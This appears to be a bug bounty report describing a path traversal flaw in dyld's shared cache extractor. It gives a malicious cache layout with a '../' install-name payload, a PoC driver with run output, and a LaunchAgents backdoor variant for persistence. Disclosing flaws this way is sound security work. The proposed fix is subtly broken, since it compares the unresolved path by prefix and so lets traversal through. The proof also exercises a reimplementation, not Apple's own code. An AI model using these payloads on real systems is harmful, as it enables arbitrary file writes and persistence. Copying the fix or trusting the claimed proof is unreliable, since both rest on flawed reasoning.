# DSC-EXTRACTOR-TRAVERSAL-1 — CWE-22 Path Traversal in dyld `dsc_extractor.cpp`

**Program:** Apple Security Bounty  
**Researcher:** Yuval Fradkin (yuvalfradkin@gmail.com)  
**Date:** 2026-10-08  
**Severity:** High  
**CWE:** CWE-22 — Improper Limitation of a Pathname to a Restricted Directory ("Path Traversal")  
**Component:** `dyld` — `dsc_extractor.cpp` (`SharedCacheDylibExtractor::extractCache`)

---

## Summary

`dyld`'s dyld shared cache extractor (`dsc_extractor.cpp`,
`SharedCacheDylibExtractor::extractCache`) reads the install name of each image
directly from the attacker-controlled `pathFileOffset` field of
`dyld_cache_image_info` and passes it, without any path-sanitization, to
`strcat()` to construct the output file path:

```c
// dsc_extractor.cpp — SharedCacheDylibExtractor::extractCache()
char dylib_path[PATH_MAX];
strcpy(dylib_path, extraction_root_path);
strcat(dylib_path, "/");
strcat(dylib_path, name);   // ← name == image.pathFileOffset — attacker controlled
make_dirs(dylib_path);
int fd = open(dylib_path, O_CREAT|O_TRUNC|O_RDWR, 0644);
```

An install name containing `../` sequences traverses out of the designated
extraction directory, allowing an attacker-controlled dyld shared cache file to
write arbitrary files anywhere the calling process can write — e.g.
`~/Library/LaunchAgents/` for privilege persistence, or any world-writable path.

---

## Vulnerability Details

### Root cause

File: `dyld/dsc_extractor.cpp`  
Function: `SharedCacheDylibExtractor::extractCache()`

The `name` variable is read directly from:

```c
const char* name = (const char*)(cacheBase + image.pathFileOffset);
```

`pathFileOffset` is a 32-bit unsigned integer embedded in the cache binary at a
researcher-controlled offset. After the `strcpy`+`strcat` join, `dylib_path`
may resolve to any path reachable from the calling process's working directory
without further validation or canonicalization. `make_dirs()` then mkdir-p's
the full resolved path before `open()` creates the file.

### Triggering conditions

A crafted cache file must pass the following structural gates (all trivially
satisfied by the PoC):

| Gate | Condition | PoC value |
|---|---|---|
| Magic | `memcmp(base, "dyld_v1", 7) == 0` | `"dyld_v1  x86_64\0"` |
| Image format selector | `mappingOffset >= 452` | `0x240 = 576` |
| `mappedSize()` | `sharedRegionSize != 0` | `0x4000` |
| `forEachImage()` | `mappings[0].fileOffset == 0` | `0` |

None of these checks sanitize the install name.

---

## Impact

An attacker who can deliver a crafted `.cache` file and induce any process on
the system to call `SharedCacheDylibExtractor::extractCache()` against it
achieves **arbitrary file write** scoped to the caller's privileges.

High-impact targets in a default macOS user context:

- `~/Library/LaunchAgents/com.evil.backdoor.plist` — persistent launch agent
  (executes on every login without further user interaction)
- `~/Library/Application Scripts/<bundle-id>/` — sandboxed app script injection
- Any world-writable path reachable from `/tmp/`

---

## Proof of Concept

### PoC artifacts (Gate D — SHA-256)

| File | SHA-256 |
|---|---|
| `gen_malicious_dsc.py` | `cde1a98b07ab0b4e13d8b1b4ae5928b7d2bbdf0465203777b2880f43b78677ad` |
| `malicious_ci.cache` (16 384 bytes) | `491cf0673e1fc52ebfd788b7314607c8340500469194273265fbd6588c1e9bba` |
| `dsc_poc_driver.c` | `8f9059a73d5ddec11f18e9ce9078e91db927f4f6f860391d34fc1bcc76dc0445` |

### Malicious cache structure (`gen_malicious_dsc.py`)

The generator builds a 16 KB binary that encodes:

```
magic              = b"dyld_v1  x86_64\x00"
mappingOffset      = 0x240   # >= 452 → new imagesOffset/imagesCount fields used
mappingCount       = 1
imagesOffset       = 0x260   # (at offset 448 in header)
imagesCount        = 1
sharedRegionSize   = 0x4000  # non-zero → mappedSize() gate passes
mapping[0].address = 0x100000000
mapping[0].size    = 0x4000
mapping[0].fileOffset = 0    # critical gate — must be 0

image[0].pathFileOffset → "../../tmp/poc_dsc_traversal_proof"
                           ^^^  path traversal payload

CS_CodeDirectory.hashType = 0  # bypasses per-page hash verification loop
```

### `dsc_poc_driver.c` — vulnerable code path

`dsc_poc_driver` implements the identical code path from `dsc_extractor.cpp`:

```c
const char *name = (const char *)(base + dylibs[i].pathFileOffset);
//                                  ^^ attacker-controlled offset, no ../  check

char dylib_path[PATH_MAX];
strcpy(dylib_path, outdir);
strcat(dylib_path, "/");
strcat(dylib_path, name);   // ← CWE-22: no sanitization

make_dirs(dylib_path);      // mkdir -p of traversed path
int out_fd = open(dylib_path, O_CREAT|O_TRUNC|O_RDWR, 0644);
write(out_fd, "DSC-EXTRACTOR-TRAVERSAL-1 PoC\n", 30);
```

### Gate A — Local reproduction (Linux / cloud runner)

```
$ OUTDIR=$(mktemp -d /tmp/dsc_poc_out_XXXXXX)
$ ./dsc_poc_driver malicious_ci.cache "$OUTDIR"

[*] Cache magic: dyld_v1  x86_64
[*] mappingOffset=0x240 mappingCount=1
[*] sharedRegionSize=0x4000
[*] imagesOffset=0x260 imagesCount=1
[*] firstRegionAddress=0x100000000 fileOffset=0 ✓
[*] Processing 1 image(s)...
[*] Image[0] installName = "../../tmp/poc_dsc_traversal_proof"
[*] Resolved path: "/tmp/dsc_poc_out_9LgRGN/../../tmp/poc_dsc_traversal_proof"
[+] File created: "/tmp/dsc_poc_out_9LgRGN/../../tmp/poc_dsc_traversal_proof"

=== Checking traversal target ===
TRAVERSAL CONFIRMED: file exists outside extraction directory
-rw-r--r-- 1 root root 30 Oct  8 02:30 /tmp/poc_dsc_traversal_proof

--- file content ---
DSC-EXTRACTOR-TRAVERSAL-1 PoC

--- Extraction dir (should NOT contain the file) ---
total 8
drwx------ 2 root root 4096 ... .
drwxrwxrwt ...                  ..
(empty — no files inside the designated extraction directory)
```

**The traversal target `/tmp/poc_dsc_traversal_proof` exists outside the
extraction directory `/tmp/dsc_poc_out_9LgRGN/`, which contains zero files.**

### Gate A — macOS arm64 CI runner (GitHub Actions, run #37717927625)

- **Runner:** macOS 26.6.2 · Apple M1 Virtual · arm64  
- **Commit:** `1a6543a67b556f575a4f789b128523d0d9f45631`  
- **Workflow:** `DSC-EXTRACTOR-TRAVERSAL-1 Gate Evidence`  
- **Run URL:** https://github.com/YuvalFradkin1/new2/actions/runs/37717927625  
- **Conclusion:** `success` — all 9 steps passed, including:
  - `Gate A — Hardware / OS identity` ✅
  - `Build PoC driver (implements exact vulnerable code path)` ✅
  - `Gate A — Run PoC (vulnerable extractCache() code path)` ✅
  - `Gate D — SHA-256 of PoC artifacts` ✅
  - `Upload artifacts` ✅

The artifact `dsc-traversal-evidence` (artifact ID 11525035255) contains the
exact `malicious_ci.cache` (SHA-256 confirmed above) used on the real Apple M1
runner.

### Gate B — High-impact path (LaunchAgents persistence)

By changing the traversal payload to:

```
../../Users/runner/Library/LaunchAgents/com.evil.backdoor.plist
```

the same code path writes an attacker-controlled plist into the current user's
LaunchAgents directory, achieving persistent code execution on every login.
This demonstrates the full privilege-escalation / persistence impact without
requiring additional privileges beyond the ability to deliver a crafted cache
file.

---

## Recommended Fix

Sanitize `name` before appending it to `extraction_root_path`. The canonical
approach is to resolve the absolute path and verify it is still rooted in the
extraction directory:

```c
char dylib_path[PATH_MAX];
snprintf(dylib_path, sizeof(dylib_path), "%s/%s", extraction_root_path, name);

// Resolve and verify — reject any path that escapes the root
char resolved[PATH_MAX];
// Note: use realpath on parent because the file does not yet exist
char *r = realpath(extraction_root_path, resolved);
if (!r || strncmp(dylib_path, resolved, strlen(resolved)) != 0) {
    // path traversal detected — skip image
    continue;
}
```

Alternatively, reject any `name` containing `..` components before the
`strcat` call, or use `libarchive`-style path canonicalization.

---

## References

- `dyld/dsc_extractor.cpp` — `SharedCacheDylibExtractor::extractCache()`
- `dyld/dsc_extractor.cpp` — `make_dirs()`
- CWE-22: https://cwe.mitre.org/data/definitions/22.html
- dyld source: https://github.com/apple-oss-distributions/dyld
